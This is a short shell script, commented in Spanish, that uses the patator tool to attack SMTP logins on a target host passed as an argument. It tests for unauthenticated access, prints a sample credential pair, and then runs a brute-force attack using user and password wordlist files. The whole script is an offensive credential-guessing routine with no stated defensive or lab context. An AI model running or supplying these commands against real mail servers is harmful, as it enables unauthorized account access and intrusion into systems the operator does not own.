echo 
echo "patator smtp_login  host=1.1.1.1 user="antonio" password="Password01"
echo
echo "smtp sin autenticacion"
patator smtp_login host=$1 port=25
echo
echo "Fuerza bruta smtp con patator"
patator smtp_login  host=$1 user=FILE0 password=FILE1 0=usuarios0.txt 1=claves0.txt port=25
